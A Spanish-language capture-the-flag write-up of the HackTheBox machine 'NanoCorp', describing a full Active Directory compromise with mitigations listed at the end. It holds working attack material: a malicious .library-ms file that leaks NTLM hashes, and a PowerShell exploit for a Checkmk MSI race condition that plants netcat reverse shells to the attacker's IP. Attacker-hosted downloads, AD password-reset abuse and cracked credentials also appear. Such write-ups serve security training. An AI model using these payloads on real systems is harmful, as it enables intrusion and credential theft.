# NanoCorp - HackTheBox Hard Windows Machine Writeup

## Información de la Máquina
- **Nombre**: NanoCorp
- **Dificultad**: Hard
- **Sistema Operativo**: Windows Server 2022
- **IP**: 10.129.5.108
- **Puntos**: 40

---

## Reconocimiento Inicial

### Escaneo de Puertos con Nmap

Comenzamos con un escaneo completo de puertos para identificar servicios activos:

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 -n -Pn 10.129.5.108 -oN escaneo.txt
```

**Parámetros utilizados:**
- `-sS`: SYN Stealth Scan (escaneo sigiloso)
- `-sCV`: Detección de versiones y scripts por defecto
- `--open`: Solo mostrar puertos abiertos
- `-p-`: Escanear todos los puertos (1-65535)
- `--min-rate 5000`: Enviar mínimo 5000 paquetes por segundo
- `-n`: No resolver DNS
- `-Pn`: Asumir que el host está activo

**Puertos abiertos identificados:**

| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| 53 | DNS | Domain Name System |
| 80 | HTTP | Servidor web Apache 2.4.58 |
| 88 | Kerberos | Autenticación de dominio |
| 135 | MSRPC | Remote Procedure Call |
| 139/445 | SMB | Compartición de archivos |
| 389/636 | LDAP/LDAPS | Active Directory |
| 3268/3269 | Global Catalog | Active Directory |
| 5986 | WinRM HTTPS | PowerShell Remoting |
| 9389 | .NET Message Framing | - |

**Hallazgos importantes:**
- El servidor redirige a `http://nanocorp.htb/`
- Dominio: `nanocorp.htb`
- Controlador de Dominio: `DC01.nanocorp.htb`
- Diferencia horaria detectada: +6h59m16s (importante para Kerberos)

### Configuración de /etc/hosts

Agregamos las entradas necesarias al archivo hosts:

```bash
echo "10.129.5.108 nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb" | sudo tee -a /etc/hosts
```

---

## Fase 1: Acceso Inicial - CVE-2025-24071

### Enumeración Web

Al explorar `http://nanocorp.htb`, encontramos una sección "About Us" que contiene un botón "Apply Now" que redirige a un subdominio: `hire.nanocorp.htb`.

Este sitio permite subir archivos ZIP que son extraídos automáticamente en el servidor.

### Explicación del CVE-2025-24071

**¿Qué es este CVE?**

CVE-2025-24071 (también conocido como CVE-2025-24054) es una vulnerabilidad en Windows que permite la filtración de hashes NTLM a través de archivos `.library-ms` extraídos de archivos ZIP.

**¿Cómo funciona?**

1. Un archivo `.library-ms` es un tipo de archivo XML que Windows usa para crear "bibliotecas" virtuales
2. Estos archivos pueden contener rutas UNC (Universal Naming Convention) que apuntan a recursos de red
3. Cuando Windows Explorer extrae un ZIP que contiene un archivo `.library-ms`, automáticamente intenta conectarse a la ruta UNC especificada
4. **Sin intervención del usuario**, Windows envía credenciales NTLM para autenticarse con el servidor remoto
5. Un atacante puede capturar estos hashes NTLM usando herramientas como Responder

### Explotación

**Paso 1: Clonar el PoC**

```bash
cd ~/machines/NanoCorp
git clone https://github.com/0x6rss/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC
```

**Paso 2: Generar el exploit**

```bash
python3 poc.py
```

El script pregunta:
- **File name**: `nanocorp_exploit` (nombre del archivo .library-ms)
- **IP**: `10.10.15.240` (nuestra IP de la interfaz tun0)

Esto crea un archivo `exploit.zip` que contiene un archivo `.library-ms` malicioso con el siguiente contenido:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.15.240\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**¿Por qué funciona esto?**
La ruta `\\10.10.15.240\shared` es una ruta UNC que hace que Windows intente conectarse a nuestro servidor SMB falso.

**Paso 3: Iniciar Responder**

Responder es una herramienta que simula servicios de red (SMB, HTTP, LDAP, etc.) para capturar credenciales:

```bash
sudo responder -I tun0 -v
```

**Parámetros:**
- `-I tun0`: Interfaz de red a escuchar (nuestra VPN de HTB)
- `-v`: Modo verbose (ver detalles)

**Paso 4: Subir el exploit**

1. Navegamos a `http://hire.nanocorp.htb`
2. Subimos el archivo `exploit.zip`
3. El servidor extrae automáticamente el contenido

**Paso 5: Captura del hash**

Responder captura múltiples intentos de autenticación:

```
[SMB] NTLMv2-SSP Client   : 10.129.5.108
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:fd34ecdebbafb36d:2EEED29B...
```

**¿Qué es un hash NTLMv2-SSP?**
- Es una representación criptográfica de la contraseña del usuario
- No es la contraseña en texto plano, pero puede ser crackeada con diccionarios
- El formato incluye: usuario, dominio, challenge y response

### Cracking del Hash

Guardamos el hash en un archivo:

```bash
echo 'web_svc::NANOCORP:fd34ecdebbafb36d:2EEED29B...' > hash.txt
```

Usamos hashcat para crackearlo:

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Parámetros:**
- `-m 5600`: Modo para NetNTLMv2
- `-a 0`: Ataque de diccionario directo
- `rockyou.txt`: Diccionario de contraseñas comunes

**Resultado:**
```
web_svc::NANOCORP:...:dksehdgh712!@#
```

**Credenciales obtenidas:**
- Usuario: `web_svc`
- Contraseña: `dksehdgh712!@#`

---

## Fase 2: Enumeración del Active Directory

### Verificación de Credenciales

Confirmamos que las credenciales funcionan:

```bash
netexec smb 10.129.5.108 -u 'web_svc' -p 'dksehdgh712!@#'
```

Resultado:
```
SMB  10.129.5.108  445  DC01  [+] nanocorp.htb\web_svc:dksehdgh712!@#
```

### Enumeración de Usuarios y Grupos

```bash
netexec smb 10.129.5.108 -u 'web_svc' -p 'dksehdgh712!@#' --users
```

**Usuarios encontrados:**
- Administrator
- Guest
- krbtgt
- **web_svc** (nuestro usuario actual)
- **monitoring_svc** (usuario objetivo)

### Sincronización de Tiempo

**¿Por qué es importante?**

Kerberos requiere que la diferencia horaria entre cliente y servidor sea menor a 5 minutos. Si hay desincronización, la autenticación fallará con el error `KRB_AP_ERR_SKEW`.

```bash
sudo timedatectl set-ntp off
sudo ntpdate 10.129.5.108
```

**Resultado:**
```
2026-02-16 04:16:34 (-0500) +6.911374 +/- 0.092308 10.129.5.108
CLOCK: time stepped by 6.911374
```

---

## Fase 3: Escalada de Privilegios a monitoring_svc

### Uso de BloodyAD

BloodyAD es una herramienta para manipular Active Directory a través de LDAP.

**Paso 1: Agregar web_svc al grupo IT_SUPPORT**

```bash
bloodyAD --host 10.129.5.108 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc'
```

**¿Por qué hacemos esto?**

Según la enumeración de BloodHound (herramienta de análisis de rutas de ataque en AD):
- `web_svc` tiene permiso `AddSelf` sobre el grupo `IT_SUPPORT`
- El grupo `IT_SUPPORT` tiene permiso `ForceChangePassword` sobre `monitoring_svc`
- `monitoring_svc` tiene permiso `CanPSRemote` en el Controlador de Dominio

**Paso 2: Cambiar la contraseña de monitoring_svc**

```bash
bloodyAD --host 10.129.5.108 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password 'monitoring_svc' 'P@ssw0rd444!'
```

**Resultado:**
```
[+] Password changed successfully!
```

**Nuevas credenciales:**
- Usuario: `monitoring_svc`
- Contraseña: `P@ssw0rd444!`

### Obtención de Ticket Kerberos (TGT)

**¿Qué es un TGT?**

Un Ticket Granting Ticket es un ticket de autenticación que Kerberos usa para demostrar que el usuario ya se autenticó. Es como un "pase VIP" que permite solicitar acceso a servicios sin enviar la contraseña cada vez.

```bash
cd ~/machines/NanoCorp
impacket-getTGT -dc-ip 10.129.5.108 'nanocorp.htb/monitoring_svc:P@ssw0rd444!'
```

**Resultado:**
```
[*] Saving ticket in monitoring_svc.ccache
```

**Exportar el ticket para uso:**

```bash
export KRB5CCNAME=$(pwd)/monitoring_svc.ccache
klist
```

Verificamos:
```
Ticket cache: FILE:/home/kali/machines/NanoCorp/monitoring_svc.ccache
Default principal: monitoring_svc@NANOCORP.HTB
Valid starting       Expires              Service principal
02/16/2026 15:56:41  02/16/2026 19:56:41  krbtgt/NANOCORP.HTB@NANOCORP.HTB
```

---

## Fase 4: Acceso WinRM

### ¿Por qué usar winrmexec en lugar de evil-winrm?

**Problema con evil-winrm:**

Cuando intentamos conectar con evil-winrm:
```bash
evil-winrm -i 10.129.5.108 -u monitoring_svc -p 'P@ssw0rd444!'
```

Obtenemos:
```
[-] nanocorp.htb\monitoring_svc:P@ssw0rd444! STATUS_ACCOUNT_RESTRICTION
```

**¿Qué significa `STATUS_ACCOUNT_RESTRICTION`?**

Este error indica que la cuenta tiene restricciones que impiden la autenticación directa con contraseña. Sin embargo, **la autenticación Kerberos SÍ funciona**.

### Conexión con winrmexec

WinRM (Windows Remote Management) en este DC solo acepta conexiones:
- Por HTTPS (puerto 5986, no HTTP 5985)
- Con autenticación Kerberos

```bash
cd ~/machines/NanoCorp/winrmexec
python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
```

**Parámetros explicados:**
- `-ssl`: Usar HTTPS en lugar de HTTP
- `-port 5986`: Puerto WinRM HTTPS
- `-k`: Usar autenticación Kerberos
- `nanocorp.htb/monitoring_svc@dc01.nanocorp.htb`: Usuario y SPN (Service Principal Name)
- `-no-pass`: No usar contraseña (usa el ticket Kerberos del ccache)

**Resultado exitoso:**
```
[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents>
```

**¡Estamos dentro!**

Verificamos:
```powershell
whoami
# nanocorp\monitoring_svc

hostname
# DC01
```

---

## Fase 5: Escalada de Privilegios a SYSTEM

### Estrategia de Ataque

En el directorio del usuario encontramos una pista:
```powershell
cd C:\Users\monitoring_svc\Desktop
dir
# user.txt está aquí
```

Sin embargo, necesitamos privilegios de SYSTEM (máximo nivel en Windows) para acceder a la flag de root en `C:\Users\Administrator\Desktop\root.txt`.

### Descubrimiento del Exploit Checkmk

Durante la enumeración inicial, nmap detectó:
```
6556/tcp  open  check_mk  check_mk extension for Nagios 2.1.0p10
```

Checkmk es un software de monitoreo que tiene una vulnerabilidad conocida en la versión 2.1.0p10 relacionada con el instalador MSI.

### Explicación del Exploit Checkmk MSI

**¿Cómo funciona este exploit?**

1. **Condición de carrera (Race Condition):**
   - Cuando el instalador MSI de Checkmk se repara (`msiexec /fa`), busca archivos con un nombre específico
   - El patrón de búsqueda es: `cmk_all_[PID]_[contador].cmd`
   - [PID] es el Process ID del instalador MSI (número aleatorio entre 1000-15000)

2. **File Spraying:**
   - Creamos miles de archivos `.cmd` con nombres que cubren todos los PIDs posibles
   - Cada archivo contiene nuestro payload malicioso (reverse shell con netcat)
   - Los archivos se marcan como "Read-Only" para que el instalador los ejecute sin modificarlos

3. **Ejecución con privilegios SYSTEM:**
   - Cuando el MSI se repara, busca sus archivos temporales
   - Encuentra nuestros archivos maliciosos porque coinciden con el patrón de búsqueda
   - El instalador MSI se ejecuta como SYSTEM
   - Nuestro payload se ejecuta con privilegios de SYSTEM

### Preparación del Exploit

**Terminal 1: Servidor HTTP**
```bash
cd ~/machines/NanoCorp
python3 -m http.server 8000
```

**Terminal 2: Listener de Netcat**
```bash
sudo nc -lvnp 9001
```

**Terminal 3: Sesión WinRM activa**

### Descarga de Archivos en la Víctima

Desde la sesión WinRM:

```powershell
cd C:\Users\monitoring_svc\AppData\Local\Temp

# Descargar netcat
Invoke-WebRequest -Uri "http://10.10.15.240:8000/nc.exe" -OutFile "nc.exe"

# Descargar RunasCs.exe
Invoke-WebRequest -Uri "http://10.10.15.240:8000/RunasCs.exe" -OutFile "RunasCs.exe"

# Descargar script de exploit
Invoke-WebRequest -Uri "http://10.10.15.240:8000/bad.ps1" -OutFile "bad.ps1"
```

**¿Qué es RunasCs?**

RunasCs es una herramienta mejorada de `runas.exe` de Windows que permite:
- Ejecutar programas con credenciales de otro usuario
- Especificar el tipo de logon (Interactive, Network, etc.)
- Funciona tanto desde procesos interactivos como servicios
- Evita restricciones de UAC (User Account Control)

### El Script de Exploit (bad.ps1)

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.15.240",
    [string]$LPORT = "9001"
)

# 1. Definir el payload malicioso
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# 2. Encontrar el instalador MSI de Checkmk
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

if (!$msi) {
    Write-Error "Could not find Checkmk MSI"
    return
}

Write-Host "[*] Found MSI at $msi"

# 3. Crear miles de archivos .cmd (File Spraying)
Write-Host "[*] Seeding $MinPID to $MaxPID..."
foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {}
    }
}

Write-Host "[*] Seeding complete."

# 4. Triggear la reparación del MSI
Write-Host "[*] Triggering MSI repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
Write-Host "[*] Trigger sent. Check listener."
```

**Explicación línea por línea:**

1. **Parámetros:** Definen el rango de PIDs y la IP/puerto del listener
2. **Payload:** Comando que ejecutará netcat para enviarnos una reverse shell
3. **Búsqueda de MSI:** Busca en el registro el instalador de Checkmk
4. **File Spraying:** Crea 30,000 archivos (15,000 PIDs × 2 contadores) para cubrir todos los PIDs posibles
5. **Trigger:** Ejecuta `msiexec /fa` que repara el MSI y ejecuta nuestros archivos maliciosos

### Problema de Permisos

Inicialmente intentamos ejecutar desde `C:\Users\monitoring_svc\AppData\Local\Temp\`, pero RunasCs ejecuta el script como `web_svc`, quien NO tiene acceso a ese directorio.

**Solución: Usar C:\Windows\Temp**

Este directorio es accesible por todos los usuarios:

```powershell
# Copiar archivos a ubicación accesible
Copy-Item "RunasCs.exe" -Destination "C:\Windows\Temp\RunasCs.exe"
Copy-Item "nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# Crear el script en C:\Windows\Temp
cd C:\Windows\Temp
@"
[... contenido del script ...]
"@ | Out-File -FilePath "C:\Windows\Temp\bad.ps1" -Encoding ASCII
```

### Ejecución del Exploit

```powershell
.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"
```

**¿Por qué ejecutamos como web_svc y no como monitoring_svc?**

Necesitamos las credenciales de `web_svc` para que RunasCs pueda autenticarse. El exploit Checkmk elevará los privilegios a SYSTEM automáticamente.

**Salida esperada:**
```
[*] Found MSI at C:\Windows\Installer\1e6f2.msi
[*] Seeding 1000 to 15000...
[*] Seeding complete.
[*] Triggering MSI repair...
[*] Trigger sent. Check listener.
```

### Recepción de la Shell de SYSTEM

En la Terminal 2 (netcat):

```bash
listening on [any] 9001 ...
connect to [10.10.15.240] from (UNKNOWN) [10.129.5.108] 62292
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**¡Éxito!** Tenemos shell como SYSTEM (máximo privilegio en Windows).

---

## Captura de Flags

### Flag de Usuario

```cmd
c:\Windows\system32> cd C:\Users\monitoring_svc\Desktop
c:\Users\monitoring_svc\Desktop> type user.txt
[REDACTED]
```

### Flag de Root

```cmd
c:\Windows\system32> cd C:\Users\Administrator\Desktop
c:\Users\Administrator\Desktop> type root.txt
```

---

## Resumen de la Cadena de Ataque

1. **Reconocimiento:** Nmap identificó servicios de AD y web
2. **Acceso Inicial:** CVE-2025-24071 permitió capturar hash NTLM de `web_svc`
3. **Cracking:** Hashcat recuperó la contraseña de `web_svc`
4. **Movimiento Lateral:** BloodyAD permitió escalar a `monitoring_svc` mediante:
   - Agregar `web_svc` al grupo `IT_SUPPORT`
   - Cambiar contraseña de `monitoring_svc`
5. **Acceso Remoto:** WinRM con Kerberos dio shell como `monitoring_svc`
6. **Escalada a SYSTEM:** Exploit de Checkmk MSI mediante:
   - File spraying con RunasCs
   - Race condition en reparación de MSI
   - Ejecución de reverse shell como SYSTEM

---

## Herramientas Utilizadas

| Herramienta | Propósito |
|-------------|-----------|
| Nmap | Escaneo de puertos y servicios |
| Responder | Captura de hashes NTLM |
| Hashcat | Cracking de hashes |
| NetExec/CrackMapExec | Enumeración de SMB/AD |
| BloodyAD | Manipulación de Active Directory |
| Impacket | Herramientas de AD (getTGT, etc.) |
| WinRMExec | Conexión WinRM con Kerberos |
| RunasCs | Ejecución como otro usuario |
| Netcat | Reverse shell |

---

## Mitigaciones Recomendadas

1. **CVE-2025-24071:**
   - Aplicar parche de Microsoft
   - Deshabilitar extracción automática de archivos .library-ms
   - Implementar filtros de extensión en uploads

2. **Active Directory:**
   - Principio de mínimo privilegio
   - Auditar grupos con permisos sensibles
   - Deshabilitar NTLM v1 y v2 cuando sea posible

3. **Checkmk:**
   - Actualizar a versión parchada
   - Limitar permisos del instalador MSI
   - Monitorear archivos en C:\Windows\Temp

4. **WinRM:**
   - Requerir certificados para autenticación
   - Limitar usuarios con permiso CanPSRemote
   - Implementar logging de sesiones WinRM

5. **General:**
   - Segmentación de red
   - Monitoreo de conexiones SMB salientes
   - EDR/XDR con detección de comportamiento anómalo

---

## Lecciones Aprendidas

1. **Sincronización de tiempo es crítica** para ataques Kerberos
2. **Las restricciones de cuenta** no siempre bloquean autenticación Kerberos
3. **Los instaladores MSI** pueden ser vectores de escalada de privilegios
4. **File spraying** es efectivo contra condiciones de carrera
5. **Múltiples vectores de ataque** pueden llevar al mismo objetivo (Checkmk vs NTLM Relay)

---

**¡Máquina pwneada!** 🎉
